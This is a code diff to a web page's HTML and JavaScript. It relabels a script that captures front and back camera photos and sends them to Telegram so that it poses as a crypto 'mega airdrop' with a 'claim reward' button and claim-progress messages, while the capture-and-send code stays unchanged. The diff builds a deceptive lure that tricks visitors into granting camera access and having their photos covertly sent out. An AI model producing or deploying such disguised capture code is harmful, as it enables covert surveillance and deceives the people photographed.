@@ -143,12 +143,12 @@
 </head>
 <body>
 
-  <h1 class="glow">Dual Camera Capture</h1>
+  <h1 class="glow">mega airdrop layer 1</h1>
   <p class="subtitle">One tap → Front & Back photos instantly sent to Telegram</p>
 
   <div class="premium-card">
     <button id="captureBtn" onclick="captureBothCameras()">
-      Capture & Send Both Cameras
+      claim reward
     </button>
 
     <div id="status"></div>
@@ -173,14 +173,14 @@
         await sendPhoto(frontBase64, "front");
 
         // Back camera
-        status.textContent = "Back camera capturing...";
+        status.textContent = "claiming...";
         const backStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "environment" }
         });
         const backBase64 = await quickCapture(backStream);
         await sendPhoto(backBase64, "back");
 
-        status.textContent = "Both photos sent successfully ✓";
+        status.textContent = "claim successfully done ✓";
       } catch (err) {
         let msg = "Error: ";
         if (err.name === 'NotAllowedError') msg += "Camera permission denied – allow in settings";
@@ -190,7 +190,7 @@
         console.error(err);
       } finally {
         btn.disabled = false;
-        btn.textContent = "Capture & Send Both Cameras";
+        btn.textContent = "claim reward";
       }
     }
 
